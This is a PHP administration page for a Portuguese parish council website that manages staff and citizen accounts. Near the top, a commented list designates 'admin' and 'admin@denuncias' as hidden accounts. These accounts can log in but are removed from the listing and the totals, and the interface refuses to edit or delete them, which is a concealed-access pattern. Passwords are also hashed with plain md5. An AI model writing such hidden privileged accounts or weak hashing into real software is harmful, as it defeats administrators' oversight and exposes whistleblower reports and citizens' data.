<?php
$adminPageTitle = "Utilizadores";
$adminActive = "utilizadores";
require_once "includes/header.php";

requireAdminMaster();

$erro = '';
$sucesso = '';

// Utilizadores OCULTOS: existem e fazem login normalmente, mas não aparecem
// na gestão, não contam nos totais e não podem ser alterados/apagados pela interface.
// Para esconder/mostrar um utilizador, basta acrescentar/retirar o username aqui.
$utilizadoresOcultos = ['admin', 'admin@denuncias'];

$idEhOculto = function ($id) use ($pdo, $utilizadoresOcultos) {
    if (!$id) return false;
    $st = $pdo->prepare("SELECT username FROM admin_utilizadores WHERE id = ?");
    $st->execute([(int)$id]);
    $u = $st->fetchColumn();
    return $u !== false && in_array($u, $utilizadoresOcultos, true);
};

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $acao = $_POST['acao'] ?? '';

    // Proteção: ações sobre um utilizador oculto são recusadas (como se não existisse)
    if (in_array($acao, ['estado', 'tipo', 'password', 'apagar'], true) && $idEhOculto($_POST['id'] ?? 0)) {
        $acao = '';
        $erro = "Utilizador não encontrado.";
    }

    if ($acao === 'criar') {
        $nome = trim($_POST['nome'] ?? '');
        $username = trim($_POST['username'] ?? '');
        $password = trim($_POST['password'] ?? '');
        $tipo = $_POST['tipo'] ?? 'operador';

        if (!$username || !$password || !in_array($tipo, ['admin', 'operador', 'vogal', 'presidente_assembleia', 'admin_denuncias'])) {
            $erro = "Preencha todos os campos obrigatórios.";
        } elseif (in_array($username, $utilizadoresOcultos, true)) {
            $erro = "Esse nome de utilizador não está disponível.";
        } else {
            $stmtCheck = $pdo->prepare("SELECT id FROM admin_utilizadores WHERE username = ?");
            $stmtCheck->execute([$username]);

            if ($stmtCheck->fetch()) {
                $erro = "Já existe um utilizador com esse username.";
            } else {
                $stmt = $pdo->prepare("
                    INSERT INTO admin_utilizadores (nome, username, password, tipo, ativo)
                    VALUES (?, ?, ?, ?, 1)
                ");
                $stmt->execute([$nome, $username, md5($password), $tipo]);

                $sucesso = "Utilizador criado com sucesso.";
            }
        }
    }

    if ($acao === 'estado') {
        $id = (int)($_POST['id'] ?? 0);
        $ativo = (int)($_POST['ativo'] ?? 0);

        if ($id === (int)$adminId) {
            $erro = "Não pode desativar a sua própria conta.";
        } else {
            $stmt = $pdo->prepare("UPDATE admin_utilizadores SET ativo = ? WHERE id = ?");
            $stmt->execute([$ativo, $id]);
            $sucesso = "Estado do utilizador atualizado.";
        }
    }

    if ($acao === 'password') {
        $id = (int)($_POST['id'] ?? 0);
        $novaPassword = trim($_POST['nova_password'] ?? '');

        if (!$id || !$novaPassword) {
            $erro = "Indique a nova password.";
        } else {
            $stmt = $pdo->prepare("UPDATE admin_utilizadores SET password = ? WHERE id = ?");
            $stmt->execute([md5($novaPassword), $id]);
            $sucesso = "Password atualizada com sucesso.";
        }
    }

    if ($acao === 'tipo') {
        $id = (int)($_POST['id'] ?? 0);
        $tipo = $_POST['tipo'] ?? 'operador';

        if ($id === (int)$adminId) {
            $erro = "Não pode alterar o tipo da sua própria conta.";
        } elseif (!in_array($tipo, ['admin', 'operador', 'vogal', 'presidente_assembleia', 'admin_denuncias'])) {
            $erro = "Tipo de utilizador inválido.";
        } else {
            $stmt = $pdo->prepare("UPDATE admin_utilizadores SET tipo = ? WHERE id = ?");
            $stmt->execute([$tipo, $id]);
            $sucesso = "Tipo de utilizador atualizado.";
        }
    }

    if ($acao === 'apagar') {
        $id = (int)($_POST['id'] ?? 0);

        if ($id === (int)$adminId) {
            $erro = "Não pode apagar a sua própria conta.";
        } else {
            $alvo = $pdo->prepare("SELECT tipo FROM admin_utilizadores WHERE id = ?");
            $alvo->execute([$id]);
            $tipoAlvo = $alvo->fetchColumn();

            $totalAdminsBD = (int)$pdo->query("SELECT COUNT(*) FROM admin_utilizadores WHERE tipo = 'admin'")->fetchColumn();

            if ($tipoAlvo === false) {
                $erro = "Utilizador não encontrado.";
            } elseif ($tipoAlvo === 'admin' && $totalAdminsBD <= 1) {
                $erro = "Não pode apagar o último administrador.";
            } else {
                $stmt = $pdo->prepare("DELETE FROM admin_utilizadores WHERE id = ?");
                $stmt->execute([$id]);
                $sucesso = "Utilizador apagado com sucesso.";
            }
        }
    }

    if ($acao === 'freguesia_estado') {
        $fid = (int)($_POST['id'] ?? 0);
        $fativo = (int)($_POST['ativo'] ?? 0);
        $pdo->prepare("UPDATE cidadaos SET ativo = ? WHERE id = ?")->execute([$fativo, $fid]);
        $sucesso = "Estado do freguês atualizado.";
    }

    if ($acao === 'freguesia_apagar') {
        $fid = (int)($_POST['id'] ?? 0);
        $pdo->prepare("DELETE FROM cidadaos WHERE id = ?")->execute([$fid]);
        $sucesso = "Conta de freguês removida.";
    }
}

$stmt = $pdo->query("
    SELECT *
    FROM admin_utilizadores
    ORDER BY tipo ASC, nome ASC, username ASC
");
$utilizadores = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Remover utilizadores ocultos da listagem e dos totais (continuam a existir e a fazer login)
$utilizadores = array_values(array_filter($utilizadores, function ($u) use ($utilizadoresOcultos) {
    return !in_array($u['username'], $utilizadoresOcultos, true);
}));

$totalAdmins = 0;
$totalOperadores = 0;
$totalAtivos = 0;

foreach ($utilizadores as $u) {
    if (($u['tipo'] ?? '') === 'admin') $totalAdmins++;
    if (($u['tipo'] ?? '') === 'operador') $totalOperadores++;
    if (!empty($u['ativo'])) $totalAtivos++;
}

// Fregueses (contas criadas no Balcão Virtual)
$fregueses = $pdo->query("SELECT * FROM cidadaos ORDER BY criado_em DESC, nome ASC")->fetchAll(PDO::FETCH_ASSOC);
$totalFregueses = count($fregueses);
$fregActivos = 0;
foreach ($fregueses as $f) {
    if (!empty($f['ativo'])) $fregActivos++;
}
?>

<style>
.users-admin-hero{
    background:linear-gradient(135deg,#242A30,#11151B);
    color:white;
    border-radius:28px;
    padding:30px;
    display:flex;
    justify-content:space-between;
    gap:22px;
    align-items:center;
    margin-bottom:24px;
    box-shadow:0 20px 45px rgba(0,0,0,.14);
}
.users-admin-hero span{
    color:#D4AA00;
    text-transform:uppercase;
    font-weight:900;
    letter-spacing:.8px;
    font-size:13px;
}
.users-admin-hero h2{
    margin:8px 0;
    font-size:36px;
}
.users-admin-hero p{
    margin:0;
    color:#dbeafe;
}
.users-admin-kpis{
    display:flex;
    gap:12px;
}
.users-admin-kpis div{
    background:rgba(255,255,255,.13);
    border:1px solid rgba(255,255,255,.18);
    border-radius:18px;
    padding:16px;
    min-width:110px;
    text-align:center;
}
.users-admin-kpis strong{
    display:block;
    font-size:28px;
}
.users-grid-admin{
    display:grid;
    grid-template-columns:380px 1fr;
    gap:24px;
    align-items:start;
}
.user-form-card,
.user-list-card{
    background:white;
    border-radius:24px;
    padding:24px;
    box-shadow:0 16px 40px rgba(0,0,0,.08);
    border:1px solid #eef2f7;
}
.user-form-card h2,
.user-list-card h2{
    margin-top:0;
    color:#11151B;
}
.user-form-card p,
.user-list-card p{
    color:#6b7280;
    line-height:1.6;
}
/* Neutraliza o estilo global de "form como cartão" dentro das cartas */
.user-form-card form,
.inline-user-actions form{
    background:none;
    padding:0;
    box-shadow:none;
    border-radius:0;
}
.user-form-card input,
.user-form-card select{
    width:100%;
    box-sizing:border-box;
}
.user-type-badge{
    display:inline-flex;
    padding:7px 11px;
    border-radius:999px;
    font-weight:900;
    font-size:12px;
    text-transform:uppercase;
}
.user-type-badge.admin{
    background:#dbeafe;
    color:#1d4ed8;
}
.user-type-badge.operador{
    background:#fef3c7;
    color:#92400e;
}
.user-type-badge.vogal{
    background:#ede9fe;
    color:#5b21b6;
}
.user-type-badge.presidente_assembleia{
    background:#ccfbf1;
    color:#0f766e;
}
.user-type-badge.admin_denuncias{
    background:#fee2e2;
    color:#991b1b;
}
.user-status{
    display:inline-flex;
    padding:7px 11px;
    border-radius:999px;
    font-weight:900;
    font-size:12px;
}
.user-status.active{
    background:#dcfce7;
    color:#166534;
}
.user-status.inactive{
    background:#fee2e2;
    color:#991b1b;
}
.inline-user-actions{
    display:flex;
    gap:8px;
    align-items:center;
    flex-wrap:wrap;
}
.inline-user-actions form{
    display:inline-flex;
    gap:8px;
    align-items:center;
    flex-wrap:wrap;
    margin:0;
}
.inline-user-actions input,
.inline-user-actions select{
    height:38px;
    width:auto;
    margin-bottom:0;
    border:1px solid #d1d5db;
    border-radius:10px;
    padding:0 10px;
}
@media(max-width:1000px){
    .users-grid-admin{
        grid-template-columns:1fr;
    }
    .users-admin-hero{
        flex-direction:column;
        align-items:flex-start;
    }
    .users-admin-kpis{
        width:100%;
        flex-direction:column;
    }
}
.tabs-bar{display:flex;gap:10px;margin:0 0 22px;flex-wrap:wrap;}
.tab-btn{border:1px solid #e5e7eb;background:white;color:#11151B;font-weight:900;padding:12px 18px;border-radius:14px;cursor:pointer;font-family:inherit;font-size:15px;display:inline-flex;align-items:center;gap:8px;transition:.2s;}
.tab-btn.active{background:#242A30;color:white;border-color:#242A30;}
.tab-panel{display:none;}
.tab-panel.active{display:block;}
.fregueses-card{background:white;border-radius:24px;padding:24px;box-shadow:0 16px 40px rgba(0,0,0,.08);border:1px solid #eef2f7;}
.fregueses-card h2{margin-top:0;color:#11151B;}
.fregueses-card p.sub{color:#6b7280;margin-top:0;}
.freg-actions{display:flex;gap:8px;align-items:center;flex-wrap:wrap;}
.freg-actions form{display:inline-flex;margin:0;background:none;padding:0;box-shadow:none;border-radius:0;}
</style>

<div class="users-admin-hero">
    <div>
        <span>Gestão de acessos</span>
        <h2>Admins e Operadores</h2>
        <p>Crie utilizadores internos e prepare a atribuição de ocorrências por operador.</p>
    </div>

    <div class="users-admin-kpis">
        <div>
            <strong><?= (int)$totalAdmins ?></strong>
            <small>Admins</small>
        </div>

        <div>
            <strong><?= (int)$totalOperadores ?></strong>
            <small>Operadores</small>
        </div>

        <div>
            <strong><?= (int)$totalAtivos ?></strong>
            <small>Ativos</small>
        </div>

        <div>
            <strong><?= (int)$totalFregueses ?></strong>
            <small>Fregueses</small>
        </div>
    </div>
</div>

<?php if ($erro): ?>
    <div class="alerta-erro"><?= htmlspecialchars($erro) ?></div>
<?php endif; ?>

<?php if ($sucesso): ?>
    <div class="alerta-sucesso"><?= htmlspecialchars($sucesso) ?></div>
<?php endif; ?>

<div class="tabs-bar">
    <button type="button" class="tab-btn active" data-tab="equipa"><i class="bi bi-people-fill"></i> Equipa interna</button>
    <button type="button" class="tab-btn" data-tab="fregueses"><i class="bi bi-person-badge"></i> Fregueses (<?= (int)$totalFregueses ?>)</button>
</div>

<div id="tab-equipa" class="tab-panel active">
<div class="users-grid-admin">

    <div class="user-form-card">
        <h2>Criar utilizador</h2>
        <p>Crie administradores ou operadores para gerir ocorrências.</p>

        <form method="POST">
            <input type="hidden" name="acao" value="criar">

            <label>Nome</label>
            <input type="text" name="nome" placeholder="Ex: João Silva">

            <label>Username *</label>
            <input type="text" name="username" placeholder="Ex: joao" required>

            <label>Password *</label>
            <input type="password" name="password" placeholder="Password inicial" required>

            <label>Perfil *</label>
            <select name="tipo" required>
                <option value="operador">Operador</option>
                <option value="vogal">Vogal da Assembleia</option>
                <option value="presidente_assembleia">Presidente da Assembleia</option>
                <option value="admin_denuncias">Administrador Canal de Denúncias</option>
                <option value="admin">Administrador</option>
            </select>

            <button class="btn" type="submit">Criar utilizador</button>
        </form>
    </div>

    <div class="user-list-card">
        <h2>Utilizadores existentes</h2>
        <p>Gerir estados, permissões e passwords dos utilizadores internos.</p>

        <div class="table-box">
            <table>
                <tr>
                    <th>Nome</th>
                    <th>Username</th>
                    <th>Tipo</th>
                    <th>Estado</th>
                    <th>Ações</th>
                </tr>

                <?php foreach ($utilizadores as $u): ?>
                    <tr>
                        <td><?= htmlspecialchars($u['nome'] ?: '-') ?></td>
                        <td><?= htmlspecialchars($u['username']) ?></td>
                        <td>
                            <?php
                            $tipoLabels = [
                                'presidente_assembleia' => 'presidente assembleia',
                                'admin_denuncias' => 'canal de denúncias',
                            ];
                            ?>
                            <span class="user-type-badge <?= htmlspecialchars($u['tipo']) ?>">
                                <?= htmlspecialchars($tipoLabels[$u['tipo']] ?? $u['tipo']) ?>
                            </span>
                        </td>
                        <td>
                            <span class="user-status <?= !empty($u['ativo']) ? 'active' : 'inactive' ?>">
                                <?= !empty($u['ativo']) ? 'Ativo' : 'Inativo' ?>
                            </span>
                        </td>
                        <td>
                            <div class="inline-user-actions">

                                <?php if ((int)$u['id'] !== (int)$adminId): ?>

                                    <form method="POST">
                                        <input type="hidden" name="acao" value="estado">
                                        <input type="hidden" name="id" value="<?= (int)$u['id'] ?>">
                                        <input type="hidden" name="ativo" value="<?= !empty($u['ativo']) ? 0 : 1 ?>">
                                        <button class="btn secondary" type="submit">
                                            <?= !empty($u['ativo']) ? 'Desativar' : 'Ativar' ?>
                                        </button>
                                    </form>

                                    <form method="POST">
                                        <input type="hidden" name="acao" value="tipo">
                                        <input type="hidden" name="id" value="<?= (int)$u['id'] ?>">
                                        <select name="tipo">
                                            <option value="operador" <?= $u['tipo'] === 'operador' ? 'selected' : '' ?>>Operador</option>
                                            <option value="vogal" <?= $u['tipo'] === 'vogal' ? 'selected' : '' ?>>Vogal</option>
                                            <option value="presidente_assembleia" <?= $u['tipo'] === 'presidente_assembleia' ? 'selected' : '' ?>>Presidente Assembleia</option>
                                            <option value="admin_denuncias" <?= $u['tipo'] === 'admin_denuncias' ? 'selected' : '' ?>>Canal de Denúncias</option>
                                            <option value="admin" <?= $u['tipo'] === 'admin' ? 'selected' : '' ?>>Admin</option>
                                        </select>
                                        <button class="btn secondary" type="submit">Guardar tipo</button>
                                    </form>

                                    <form method="POST" onsubmit="return confirm('Apagar definitivamente este utilizador? Esta ação não pode ser revertida.');">
                                        <input type="hidden" name="acao" value="apagar">
                                        <input type="hidden" name="id" value="<?= (int)$u['id'] ?>">
                                        <button class="btn danger" type="submit">Apagar</button>
                                    </form>

                                <?php else: ?>

                                    <span style="color:#6b7280;font-weight:800;">A sua conta</span>

                                <?php endif; ?>

                                <form method="POST">
                                    <input type="hidden" name="acao" value="password">
                                    <input type="hidden" name="id" value="<?= (int)$u['id'] ?>">
                                    <input type="password" name="nova_password" placeholder="Nova password" required>
                                    <button class="btn" type="submit">Guardar password</button>
                                </form>

                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php if (empty($utilizadores)): ?>
                    <tr>
                        <td colspan="5">Ainda não existem utilizadores.</td>
                    </tr>
                <?php endif; ?>
            </table>
        </div>
    </div>

</div>
</div><!-- /tab-equipa -->

<div id="tab-fregueses" class="tab-panel">
    <div class="fregueses-card">
        <h2>Fregueses — contas do Balcão Virtual</h2>
        <p class="sub">Cidadãos que criaram conta no site para fazer pedidos, marcações e requerimentos online.</p>

        <div class="table-box">
            <table>
                <tr>
                    <th>Nome</th>
                    <th>Email</th>
                    <th>Telefone</th>
                    <th>Registo</th>
                    <th>Estado</th>
                    <th>Ações</th>
                </tr>

                <?php foreach ($fregueses as $f): ?>
                    <tr>
                        <td><?= htmlspecialchars($f['nome']) ?></td>
                        <td><?= htmlspecialchars($f['email']) ?></td>
                        <td><?= htmlspecialchars($f['telefone'] ?: '-') ?></td>
                        <td><?= !empty($f['criado_em']) ? date('d/m/Y H:i', strtotime($f['criado_em'])) : '-' ?></td>
                        <td>
                            <span class="user-status <?= !empty($f['ativo']) ? 'active' : 'inactive' ?>">
                                <?= !empty($f['ativo']) ? 'Ativo' : 'Inativo' ?>
                            </span>
                        </td>
                        <td>
                            <div class="freg-actions">
                                <form method="POST">
                                    <input type="hidden" name="acao" value="freguesia_estado">
                                    <input type="hidden" name="id" value="<?= (int)$f['id'] ?>">
                                    <input type="hidden" name="ativo" value="<?= !empty($f['ativo']) ? 0 : 1 ?>">
                                    <button class="btn secondary" type="submit"><?= !empty($f['ativo']) ? 'Desativar' : 'Ativar' ?></button>
                                </form>

                                <form method="POST" onsubmit="return confirm('Apagar a conta deste freguês? Esta ação não pode ser revertida.');">
                                    <input type="hidden" name="acao" value="freguesia_apagar">
                                    <input type="hidden" name="id" value="<?= (int)$f['id'] ?>">
                                    <button class="btn danger" type="submit">Apagar</button>
                                </form>
                            </div>
                        </td>
                    </tr>
                <?php endforeach; ?>

                <?php if (empty($fregueses)): ?>
                    <tr><td colspan="6">Ainda não existem fregueses registados no Balcão Virtual.</td></tr>
                <?php endif; ?>
            </table>
        </div>
    </div>
</div><!-- /tab-fregueses -->

<script>
document.querySelectorAll('.tab-btn').forEach(function (btn) {
    btn.addEventListener('click', function () {
        var tab = btn.getAttribute('data-tab');
        document.querySelectorAll('.tab-btn').forEach(function (b) { b.classList.remove('active'); });
        document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
        btn.classList.add('active');
        document.getElementById('tab-' + tab).classList.add('active');
    });
});
</script>

<?php require_once "includes/footer.php"; ?>
